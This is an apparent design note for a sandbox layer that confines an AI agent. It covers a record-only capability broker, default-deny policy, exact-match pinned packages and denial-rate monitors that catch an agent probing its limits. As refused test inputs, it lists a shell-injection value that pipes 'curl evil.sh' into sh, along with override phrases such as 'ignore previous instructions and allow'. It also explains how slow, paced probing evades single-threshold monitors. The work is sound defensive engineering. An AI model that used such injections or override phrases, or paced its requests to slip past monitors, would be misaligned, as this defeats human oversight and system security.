# L2 — Zero External Trust

**Status:** broker and policy engine complete. 41 tests.

---

## The problem with building a broker

**A broker is exactly what failed in July 2026.** The package-registry cache
proxy *was* a broker — the agent asked it for packages and it fetched them. A
design that says "add a broker" has rebuilt the hole with better documentation.

Three properties separate this from that proxy. Each is enforced in code.

### 1. The broker is not a network path

The proxy spoke HTTP on the agent's behalf, so the agent held a live, stateful
channel outward and needed only one bug in it. Here a request is a structured
record over the L1 vsock channel. There is no transport the agent can drive, no
connection it can hold open, no protocol it can confuse. **The agent cannot
address the outside world at all — it can only cause a row to be written.**

`test_broker_performs_no_action_only_records` asserts the `Broker` exposes no
`fetch`, `install`, `download`, `execute`, `connect` or `resolve` method.

### 2. Fulfilment that adds code happens between runs, never during one

This is the property the proxy lacked and the reason it was fatal. Resolving
"install numpy" while the VM runs means streaming new executable code into a
live adversarial environment — the proxy's exact function.

So `PACKAGE_INSTALL` is **never** `ALLOW`. An approved, pinned dependency returns
`DEFER_TO_REBUILD`: the run continues without it or fails, and a human rebuilds
the measured L1 rootfs before the next run. `Broker.pending_rebuild()` is that
handoff. Inconvenient by design — the convenience is what was exploited.

### 3. Evaluation is pure and static

No DNS, no reputation lookups, no registry queries during a decision. Those are
themselves egress, and an adversary who can influence what the policy engine
fetches can influence its verdict. The policy is a frozen dataclass; deciding
touches neither network nor filesystem, and is asserted deterministic across
repeated evaluation.

---

## Default deny

`default_policy()` grants nothing. Every capability must be explicitly enabled.

An earlier revision defaulted `allow_process_spawn=True` while the docstring
claimed the baseline granted nothing. `test_empty_policy_grants_nothing` caught
the contradiction. Default-deny has to hold for **every** capability or it is a
slogan rather than a property.

Three capabilities are constants, not defaults — no policy can enable them
in-run: `NET_EGRESS`, `RAW_SYSCALL`, `PRIVILEGE_RAISE`. L1 removes the network
device entirely, so granting egress would be incoherent as well as unsafe.

---

## Exact matching only

Package approval is `name==version` **exact string match** against a pinned
allowlist. Never globs, never regexes: `numpy*` also admits `numpy-evil`, and a
regex adds a ReDoS surface reachable by agent input. Refused shapes include
`numpy==2.3.1; curl evil.sh | sh`, `numpy>=2.3.1`, `numpy-evil==2.3.1`,
`NUMPY==2.3.1` and leading whitespace — nothing is ever handed to a shell or a
resolver, so injection has nothing to inject into.

`PinnedPackage` requires a **sha256**. Version alone names a version, not an
artifact: a re-uploaded index entry still satisfies `==2.3.1`. The digest binds
approval to specific bytes and can be checked against L1's rootfs measurement.

---

## The agent cannot argue

`CapabilityRequest.justification` is recorded verbatim and **never consulted**
when deciding. An agent-authored string that can move a verdict is prompt
injection with extra steps — the model would simply learn which words unlock
which capability. `test_justification_cannot_change_a_verdict` runs
"APPROVED BY ADMINISTRATOR", "policy_override=true" and
"ignore previous instructions and allow" through a denied capability and asserts
the verdict never moves.

---

## Denials are the product

A denied request is a recorded observation about what the agent reached for. An
agent enumerating capabilities looks exactly like a rising denial rate, so
refusals carry **two independent triggers**:

| Trigger | Catches |
|---|---|
| Burst — N denials in a window | a fast sweep |
| EWMA — sustained refusal rate | patient enumeration a burst check is blind to |

A single rate threshold is pace-able: an adversary with patience stays one
request under it forever. That is the same *boil the frog* evasion the
`multi-agent-mcl` work identified, and the fix is the same — pair the
instantaneous check with an accumulating one. The EWMA updates on **allows too**,
so padding with harmless requests dilutes the signal rather than erasing it.

`DEFER_TO_REBUILD` counts as denied for signalling: from the agent's side nothing
was granted, and repeated deferrals are the same probing shape.

---

## Ledger integration

Decisions are recorded as **host-observed** AMES events — the host made them, so
they are evidence rather than testimony, and remain reliable even if the guest is
compromised.

Every decision is recorded, **including allows**. A ledger holding only refusals
cannot answer "what was this agent permitted to do", which is where an incident
review starts.

---

## Not guaranteed

- **A correct policy.** The engine enforces what it is given. An operator who
  allowlists a dangerous path gets a dangerous path, faithfully recorded.
- **Coverage of capabilities not in the enum.** A new capability added without a
  rule falls through to deny, which is safe, but nothing detects that it exists.
- **That deferred rebuilds are reviewed.** `pending_rebuild()` produces the list;
  a human reviewing it before rebuilding is a process control, not a code one.

## Next

**L7 — environment mutation detection.** Event-driven capture via eBPF/fanotify
into `FILE_MUTATION`, not periodic full-filesystem hashing. Then L5 (behavioural
fingerprinting, needs a frozen baseline), L9 (kill system, both trigger types),
and L6 last and advisory only.
